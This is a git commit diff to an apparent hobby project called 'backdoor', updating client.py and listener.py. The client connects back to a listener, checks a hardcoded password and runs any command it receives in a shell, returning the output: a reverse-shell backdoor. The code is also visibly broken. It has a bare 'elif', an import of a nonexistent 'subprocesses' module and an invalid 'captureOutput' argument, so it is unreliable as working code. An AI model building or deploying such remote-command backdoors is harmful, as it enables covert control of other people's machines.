1c6ebf4d6807f6ee7ef358e188cea152bb800be8
cmplxapps <cmplxapps@gmail.com>
2021-01-18 22:12:30 -0800

    Current Progress 1/18/2021

--- backdoor/client.py
+++ backdoor/client.py
@@ -6,60 +6,53 @@ def cd(newdir):
 	path = os.path.normpath(f'{path}/{newdir}')
 	cwd = os.path.abspath(path)
 while True:
-	#IP-ENTRY
-	ip = socket.gethostname()
-	#PORT-ENTRY
-	port = 4001
-	#PASSWORD-ENTRY
-	pswd = 'password'
-	srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	path = '.'
-	cwd = os.path.abspath(path)
-	while True:
-		try:
-			srvr.connect((ip, port))
-			break
-		except:
-			continue
-	while True:
+	try:
+		#IP-ENTRY
+		ip = socket.gethostname()
+		#PORT-ENTRY
+		port = 4001
+		#PASSWORD-ENTRY
+		pswd = 'password'
+		srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		path = '.'
+		cwd = os.path.abspath(path)
+		while True:
+			try:
+				srvr.connect((ip, port))
+				break
+			except:
+				continue
 		srvr.send(b'@LOGIN')
-		msg = srvr.recv(1024).strip()
-		if msg == pswd:
-			srvr.send(b'@CONNECTED')
-			while True:
-				data = srvr.recv(1024)
-				msg = data.decode()
-				if msg == '@CONFIRM-CONNECTION':
-					break
-				else:
-					continue
-			break
-		else:
-			srvr.send(b'@DENIED')
-			continue
-	while True:
-		breakMainLoop = False
-		srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
-		data = srvr.recv(1024).strip()
-		msg = data.decode()
-		if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
-			print(msg[7:])
-			continue
-		elif msg.replace(' ', '') == '@KILL' or msg.replace(' ', '') == '::k':
-			srvr.send(b'Killing Connection...')
-			srvr.close()
-			del srvr
-			breakMainLoop = True
-		elif msg.find('cd ') == 0:
-			cd(msg[3:])
-			continue
-		else:
-			data = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
-			msg = bytes(data, 'utf-8')
-			srvr.send(msg)
-			continue
-		if breakMainLoop:
-			break
-		else:
-			srvr.send(b'Error: Client Issue, main loop condition escape;\nIgnoring...')
-			continue
+		while True:
+			data = srvr.recv(1024).strip()
+			msg = data.decode()
+			if msg == pswd:
+				srvr.send(b'@CONNECTED')
+				while True:
+					data = srvr.recv(1024)
+					msg = data.decode()
+					if msg == '@CONFIRM-CONNECTION':
+						break
+					else:
+						continue
+				break
+			else:
+				srvr.send(b'@DENIED')
+				continue
+		while True:
+			srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
+			data = srvr.recv(1024).strip()
+			msg = data.decode()
+			if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
+				print(msg[7:])
+				continue
+			elif msg.find('cd ') == 0:
+				cd(msg[3:])
+				continue
+			else:
+				msg = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
+				data = bytes(msg, 'utf-8')
+				srvr.send(data)
+				continue
+	except ConnectionResetError:
+		continue
--- backdoor/listener.py
+++ backdoor/listener.py
@@ -1,23 +1,61 @@
 import socket
 import json
+import os
+import subprocesses
+def cd(newdir):
+	global path, cwd
+	path = os.path.normpath(f'{path}/{newdir}')
+	cwd = os.path.abspath(path)
 srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
 	with open('cfg/settings.json', 'r') as file:
 		settings = json.load(file)
 	ip = socket.gethostname()
 	port = settings['port']
-	print(' - Use \'@HELP\' or \'::?\' for a list of commands.')
+	print('\n\n - Use \'@HELP\' or \'::?\' for a list of commands.')
 	print(' - Use \'@GO\' or \'::!\' to start listening for connections.')
-	usrin = input('>> ')
-	if usrin.replace(' ', '') == '@HELP' or usrin.replace(' ', '') == '::?':
-		with open('cfg/help.txt', 'r') as file:
-			print(file.read())
-	srvr.bind((ip, port))
+	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program')
 	while True:
-		data = srvr.recv(1024).strip()
-		msg = data.decode()
-		if '@HELP' in msg or '::?' in msg:
+		usrin = input('>> ')
+		if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
 			with open('cfg/help.txt', 'r') as file:
 				print(file.read())
-		elif msg.find('@HOST ') == 0: or msg.find('::h') == 0:
-			pass
+			continue
+		elif usrin.find('@GO') == 0 or usrin.find('::!') == 0:
+			break
+		else:
+			continue
+	srvr.bind((ip, port))
+	srvr.listen()
+	client, addr = srvr.accept()
+	print(f'Connection from {addr} has been established...')
+	while True:
+		data = client.recv(1024).strip()
+		msg = data.decode()
+		if msg == '@LOGIN':
+			while True:
+				login = input('Login: ')
+				data = bytes(login, 'utf-8')
+				client.send(data)
+				data = client.recv(1024).strip()
+				msg = data.decode()
+				if msg == '@CONNECTED':
+					print('Connected to Backdoor...')
+					client.send(b'@CONFIRM-CONNECTION')
+					break
+				else:
+					continue
+			continue
+		elif msg.find('@GET-INPUT ') == 0:
+			usrin = input(msg[11:])
+			if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
+				with open('cfg/help.txt', 'r') as file:
+					print(file.read())
+				continue
+			elif
+		else:
+			print(msg)
+			continue
+	settings['new-log'] = True
+	with open('cfg/settings.json', 'w') as file:
+		json.dump(settings, file)
